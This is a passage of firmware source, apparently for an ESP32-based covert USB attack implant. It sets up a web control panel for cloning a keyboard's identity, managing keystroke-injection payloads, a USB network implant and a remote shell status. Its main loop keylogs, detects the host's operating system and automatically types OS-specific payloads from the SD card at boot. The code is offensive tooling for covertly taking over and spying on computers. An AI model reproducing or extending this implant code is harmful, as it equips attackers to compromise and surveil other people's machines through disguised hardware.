    if (!g_cloneInfo.valid) {
      controlserver.send(400, "application/json",
        "{\"status\":\"error\",\"message\":\"Scan a keyboard first\"}");
      return;
    }
    if (!eccUsbCloneSaveProfile()) {
      controlserver.send(500, "application/json",
        "{\"status\":\"error\",\"message\":\"Could not save clone profile to SD\"}");
      return;
    }
    controlserver.send(200, "application/json",
      "{\"status\":\"success\",\"message\":\"Clone profile saved. Device will reboot to apply.\"}");
    delay(300); ESP.restart();
  });
  controlserver.on("/usbhost/clearclone", HTTP_POST, [](){
    eccUsbCloneClearProfile();
    controlserver.send(200, "application/json",
      "{\"status\":\"success\",\"message\":\"Clone profile cleared. Device will reboot.\"}");
    delay(300); ESP.restart();
  });
  controlserver.on("/deleteusbconfig", HTTP_POST, handleDeleteUSBConfig);
  controlserver.on("/deletepayload", HTTP_POST, handleDeletePayload);
  controlserver.on("/deleteallpayloads", HTTP_POST, handleDeleteAllPayloads);
  controlserver.on("/getcurrentlayout", handleGetCurrentLayout);
  controlserver.on("/updatehostname", HTTP_POST, handleUpdateHostname);
  controlserver.on("/gethostname", handleGetHostname);
  controlserver.on("/updatebackupwifi", HTTP_POST, handleUpdateBackupWiFi);
  controlserver.on("/deletebackupwificonfig", HTTP_POST, handleDeleteBackupWiFiConfig);
  controlserver.on("/updatepayload", HTTP_POST, handleUpdatePayload);
  controlserver.on("/payloadcounter", handlePayloadCounter);
  controlserver.on("/usb-network-implant/status", handleUsbNetworkImplantStatus);
  controlserver.on("/usb-network-implant", HTTP_POST, handleUsbNetworkImplantSet);

  eccUsbSerialRegisterRoutes();

  controlserver.on("/shell/status", []() {
    String json = "{\"status\":\"" + eccImplantJsonEscape(g_lastShellStatus) + "\"";
    json += ",\"connected\":" + String(clientServer.connected() ? "true" : "false") + "}";
    controlserver.sendHeader("Cache-Control", "no-store");
    controlserver.send(200, "application/json", json);
  });

  eccSapsanRegisterRoutes();
  httpUpdater.setup(&controlserver);
  controlserver.begin();
}

void loop() {
  controlserver.handleClient();
  eccUsbNetTask();
  UsbHost.Task();
  keylogRepeatTick();
  delay(10);
  vTaskDelay(1);

  // Check if we should auto-execute a payload
  //static bool autoExecChecked = false;
  static unsigned long osDetectionStartTime = 0;
  static bool osDetectionInProgress = false;
  static JsonDocument pendingAutoExecPlan;
  static bool hasPendingPlan = false;
  static bool firstRun = true;

  // Only check once per boot
  if (firstRun) {
    firstRun = false;
    
    if (SD.exists("/autoexec_plan.json")) {
      File file = SD.open("/autoexec_plan.json", FILE_READ);
      if (file) {
        String content = file.readString();
        file.close();
        deserializeJson(pendingAutoExecPlan, content);

        if (pendingAutoExecPlan["enabled"] == true) {
          // Check if we have a no-detection payload
          if (pendingAutoExecPlan["nodetection"]) {
            String osPayloadPath = pendingAutoExecPlan["nodetection"]["path"].as<String>();
            if (osPayloadPath.length() > 0 && SD.exists(osPayloadPath)) {
              readFile(SD, osPayloadPath);
              payload_state = 1;
              payloadExecuted = false;
              //autoExecChecked = true;
            }
          } else {
            // If no no-detection payload, proceed with OS detection
            onDetectOSRequested();
            osDetectionStartTime = millis();
            osDetectionInProgress = true;
            hasPendingPlan = true;
            //autoExecChecked = true;
          }
        }
      }
    }
  }

  // Handle OS detection completion
  if (osDetectionInProgress) {
    if (os_detection_complete) {
      // Detection complete, execute payload if available
      if (hasPendingPlan) {
        String osPayloadPath = "";

        switch (detected_os) {
          case OS_WINDOWS:
            osPayloadPath = pendingAutoExecPlan["windows"]["path"].as<String>();
            break;
          case OS_LINUX:
            osPayloadPath = pendingAutoExecPlan["linux"]["path"].as<String>();
            break;
          case OS_IOS:
            osPayloadPath = pendingAutoExecPlan["ios"]["path"].as<String>();
            break;
          case OS_MACOS:
            osPayloadPath = pendingAutoExecPlan["macos"]["path"].as<String>();
            break;
          case OS_ANDROID:
            osPayloadPath = pendingAutoExecPlan["android"]["path"].as<String>();
            break;
          case OS_CHROMEOS:
            break;
          default:
            break;
        }

        if (osPayloadPath.length() > 0 && SD.exists(osPayloadPath)) {
          readFile(SD, osPayloadPath);
          payload_state = 1;
          payloadExecuted = false;
        }
      }
      osDetectionInProgress = false;
      hasPendingPlan = false;
    } else if (millis() - osDetectionStartTime > 30000) {
      // Timeout after 30 seconds if detection fails
      os = "OS Unknown";
      os_detection_complete = true;
      osDetectionInProgress = false;
      hasPendingPlan = false;
    }
  }

  eccUsbSerialTask();
  if (payload_state == 1) {
    // Set layout before executing payload
    setLayoutFromPayload(livepayload);

    char *splitlines;
    int payloadlen = livepayload.length() + 1;
    char request[payloadlen];
    livepayload.toCharArray(request, payloadlen);
    splitlines = strtok(request, "\r\n");
    while (splitlines != NULL) {
      cmd = splitlines;
      payloadExec();
      splitlines = strtok(NULL, "\r\n");
      vTaskDelay(1);
    }
    payload_state = 0;
    cmd = "";
    livepayload = "";
    payloadExecuted = true;
  }

  // WiFi connection monitoring
  if (millis() - lastWifiCheckTime >= wifiCheckInterval) {
    lastWifiCheckTime = millis();
    
    // Only attempt reconnection if we're not currently connected
    if (WiFi.status() != WL_CONNECTED) {
      connectToWiFi();
    }
  }
  vTaskDelay(1);
}